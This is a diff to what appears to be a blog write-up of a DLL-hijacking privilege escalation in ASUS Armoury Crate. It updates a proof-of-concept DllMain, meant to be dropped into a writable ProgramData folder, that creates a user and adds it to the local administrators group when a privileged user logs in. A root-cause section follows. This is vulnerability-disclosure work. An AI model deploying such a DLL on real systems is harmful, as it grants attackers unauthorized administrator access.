@@ -64,19 +64,20 @@ A more user friendly way of showing the effective access a user has on a particu
 
 [![armoury acls gui]({{site.baseurl}}/img/acl.png)]({{site.baseurl}}/img/acl.png)
 
-Alright, now that we know we can write to `C:\ProgramData\ASUS\GamingCenterLib` we just have to compile a DLL named `.DLL` and drop it there. We will go with a simple DLL which will add a user:
+Alright, now that we know we can write to `C:\ProgramData\ASUS\GamingCenterLib` we just have to compile a DLL named `.DLL` and drop it there. We will go with a simple DLL which will add a new user to the local administrators:
 ```c++
-BOOL WINAPI DllMain(
-    HINSTANCE hinstDLL,  
-    DWORD fdwReason,     
-    LPVOID lpReserved ) 
+BOOL APIENTRY DllMain( HMODULE hModule,
+                       DWORD  ul_reason_for_call,
+                       LPVOID lpReserved
+                     )
 {
-    system("cmd /c \"net user last last /add\"");
-    return true;
+    system("C:\\Windows\\System32\\cmd.exe /c \"net user aptortellini aptortellini /add\"");
+    system("C:\\Windows\\System32\\cmd.exe /c \"net localgroup administrators aptortellini /add\"");
+    return TRUE;
 }
 ```
 
-Now that we have everything ready we just have to wait for a privileged user to log in. This is needed as the DLL is loaded by `ArmouryCrate.UserSessionHelper.exe` which runs with the highest privileges available to the user to which the session belongs. As you can see in the following demo, as soon as the privileged user logs in, we have a new user, confirming administrator-level code execution.
+Now that we have everything ready we just have to wait for a privileged user to log in. This is needed as the DLL is loaded by `ArmouryCrate.UserSessionHelper.exe` which runs with the highest privileges available to the user to which the session belongs. As soon as the privileged user logs in, we have a new admin user, confirming administrator-level code execution.
 
 ### Root cause analysis
 Let's now have a look at what caused this vulnerability. As you can see from the call stack shown in the screenshot in the beginning of this article, the DLL is loaded from code located inside `GamingCenterPlugin.dll`, at offset `QueryLibrary + 0x167d` which is actually another function I renamed `DllLoadLibraryImplement` (by reversing `GamingCenterPlugin.dll` with IDA Pro you can see most functions in this DLL have some sort of logging feature which references strings containing the possible name of the function). Here's the code responsible for the call to `LoadLibraryExW`:
